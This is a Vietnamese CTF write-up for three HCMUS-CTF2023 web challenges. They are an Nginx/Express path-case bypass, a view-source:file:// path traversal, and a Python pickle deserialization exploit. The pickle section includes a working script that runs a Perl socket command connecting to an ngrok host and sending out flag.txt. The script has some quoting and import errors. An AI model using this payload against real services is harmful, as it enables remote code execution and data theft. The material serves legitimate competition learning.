# HCMUS-CTF2023-writeup
# WEB
### Cute Quote

App.js :
```js
const express = require('express')
const app = express()
const port = 3000

app.use(express.json())
app.use(express.static('css'))

app.get('/', (req, res) => {
  res.sendFile('./index.html', { root: __dirname })
})

const quotes = ['Insanity: doing the same thing expecting different results', '{{7*7}}', '<?php system("whoami"); ?>', '42 is the Answer to the Ultimate Question of Life, the Universe, and Everything']
app.get('/api/public/quote', (req, res) => {
  let quote = quotes[Math.floor(Math.random() * quotes.length)]
  res.send(quote)
})

app.get('/api/public/fake', (req, res) => {
  res.send("HMCSU-CFT{fake_flag}")
})

const flag = process.env.FLAG || "HCMUS-CTF{real_flag}"
app.get('/api/private/flag', (req, res) => {
  res.send(flag)
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
}
```

- Nhìn sơ qua source code thì đây là một chall viết bằng Express của NodeJS và server được chạy bằng Nginx.
- Có 3 đường dẫn ta cần quan tâm tới là ```/api/public/fake``` dẫn đến fake flag, ```/api/public/quote``` dẫn đến các câu quote được lưu sẵn và cuối cùng là ```/api/private/flag``` dẫn đến flag.
- Tuy nhiên chúng ta không thể truy cập để ```/api/private/flag``` qua cách thông thường.
- Để có thể truy cập, ta sẽ lợi dụng việc sử lý URL của Nginx và Express để có thể đọc flag.
- Đây là URL của mình: ```urlchall/Api/private/flag```
- Flag ```HCMUS-CTF{where_nginx_meet_express!}```
### Safe Proxy

  ![image](https://user-images.githubusercontent.com/89735990/236755727-7eca3e63-61ea-4823-876b-931e9711136d.png)

- Đây là một chall có tag easy nhưng mình tốn khá nhiều thời gian cho nó.
- Trang web có 3 đường dẫn đến các info khác nhau.

  ![image](https://user-images.githubusercontent.com/89735990/236756363-d4ab4210-0eb8-477c-81b7-19cc4a6059d6.png)


- Nhưng khi click thử thì mình không thể vào được do một lỗi gì đó ở User Agent.
- Do không có source code nên mình cũng dám chắc lỗi nằm ở đâu,Flag nằm ở đâu, cũng như khó xác định được hướng làm bài.
- Nhưng sau khi btc gửi hint cũng như một số thắc mắc của người chơi thì mình đã thử dùng phương pháp path traversal

  ![image](https://user-images.githubusercontent.com/89735990/236756803-5cf00b87-67ad-400e-ba3d-8589ecf14d3c.png)

  ![image](https://user-images.githubusercontent.com/89735990/236756877-689cb4bb-dc51-4455-ad4c-3524036f5446.png)
  
- Mình đã thử với sử dụng cách URI Scheme khác và mình nhận ra có thể dùng ```view-source:file://``` để truyền payload path traversal vào.

  ![image](https://user-images.githubusercontent.com/89735990/236757691-f10082a4-21fe-4a2a-884d-a06f3396d223.png)

- FLag : ```HCMUS-CTF{browser_scheme_is_interesting}```
### Python Pickle
Server.py:
```py
import pandas as pd
import io
import time
import threading
import socketserver
import sys
from io import StringIO
import secrets
import os
import numpy as np

FLAG_FILE = "flag.txt"
PORT = int(os.getenv("APP_PORT"))
HOST = "0.0.0.0"

original_stdout = sys.stdout

class Service(socketserver.BaseRequestHandler):
    def handle(self):
        captured_output = StringIO()
        sys.stdout = captured_output
        self.flag = self.get_flag()
        
        token = secrets.token_bytes(16)
        
        self.send(b"Gimme your pickle data size (send as byte string)\n")
        data_size = int(self.request.recv(64).decode())
        
        self.send(b"Gimme your pickle data frame (raw bytes)\n")
        pickle_data = self.receive(data_size)
        df = pd.read_pickle(io.BytesIO(pickle_data))
        
        try:
            if bytes(np.random.choice(df["x"], size=16)) == token:
                print(self.flag)
            else:
                raise Exception("Oh no!")
        except Exception as e:
            print("Oops, you missed it!")
            print(e)
        
        self.send(captured_output.getvalue().encode())
        sys.stdout = original_stdout
        
            
    def get_flag(self):
        with open(FLAG_FILE, 'rb') as f:
            return f.readline()
    
    def send(self, s: str):
        self.request.sendall(s.encode("utf-8"))
        
    def send(self, b: bytes):
        self.request.sendall(b)

    def receive(self, b = 1024):
        data = b""
        while len(data) != b:
            data += self.request.recv(256)
        return data
    
class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass

def main():
    service = Service
    server = ThreadedService((HOST, PORT), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    print("Server started on " + str(server.server_address) + "!")
    # Now let the main thread just wait...
    while True:
        time.sleep(10)
        
if __name__ == "__main__":
    main()
```
- Đọc sơ qua code mình phát hiện được rằng server không hề kiểm tra user input mà sẽ dùng trực tiếp để deserialied.
- Từ đó ta có thể lợi dụng điều này để có thể truyền input vào và get flag.
```py
    def receive(self, b = 1024):
        data = b""
        while len(data) != b:
            data += self.request.recv(256)
        return data
```
- Hàm recive bắt buộc phải nhận đúng 256 byte nếu không sẽ bị lỗi.
- Ý tưởng của mình ngrok để dựng lên một TCP server rồi dùng perl để mở lại stdin stdout stderr và ```cat flag.txt```
```py
import pickle
import base64
import os
import pandas

#r = remote("127.0.0.1", 4135)
r = remote(
    "pickle-trouble-0d7cddd74709c50c.chall.ctf.blackpinker.com", 443, ssl=True)


class RCE:
    def __reduce__(self):
        cmd = 'perl -e \'use Socket;'
        cmd += "$i='0.tcp.ap.ngrok.io'; $p=10151;"
        cmd += "socket(s, PF_INET, SOCK_STREAM, getprotobyname('tcp'));"
        cmd += "if(connect(s,sockaddr_in($p, inet_aton($i))))"
        cmd += "{open(STDIN, '>&s');open(STDOUT,'>&s'); open(STDERR, '>&s'); exec('cat flag.txt');};\"
        cmd = cmd.ljust(256, 'S')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    r.recvuntil(b"byte string)\n")
    r.sendline(b'256')
    r.recvuntil(b'(raw bytes)\n')
    r.sendline(pickled)
    r.interactive()
    ```
  Flag : ```HCMUS-CTF{S||\/|pL3_p1cKlE_ExpL01t-Huh}```

